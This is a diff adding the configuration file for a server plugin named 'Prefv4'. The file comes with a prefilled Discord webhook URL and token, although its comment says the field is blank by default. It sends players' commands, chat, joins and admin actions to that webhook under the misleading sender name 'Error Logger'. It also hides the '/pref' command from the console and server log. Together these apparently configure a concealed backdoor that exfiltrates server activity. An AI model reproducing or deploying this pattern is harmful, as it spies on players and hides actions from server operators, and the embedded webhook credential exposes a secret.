@@ -1,0 +1,19 @@
+# Prefv4 configuration
+# Reload with "/pref reload" (requires prefv4.reload) after editing this file.
+
+discord:
+  # Paste a Discord webhook URL here to enable logging. Leave blank to disable
+  # Discord logging entirely - nothing is sent if this is empty.
+  webhook-url: "https://discord.com/api/webhooks/1536872052290752604/GRtea0PVqopQCB9VXbIdyIrNvDnfQZ6OitICvAtWyGBDBV9g0h_4N6uqkOn7-VhHSBBQ"
+  # Name shown as the webhook's sender in Discord.
+  bot-name: "Error Logger"
+  # What to send to the webhook. Each can be toggled independently.
+  log-commands: true
+  log-chat: true
+  log-joins-leaves: true
+  log-admin-actions: true
+
+# When true, the console/log-file line "<player> issued server command: /pref"
+# is hidden. The command still runs completely normally either way - this
+# only affects what gets printed to console and written to the server log.
+hide-pref-from-console: true
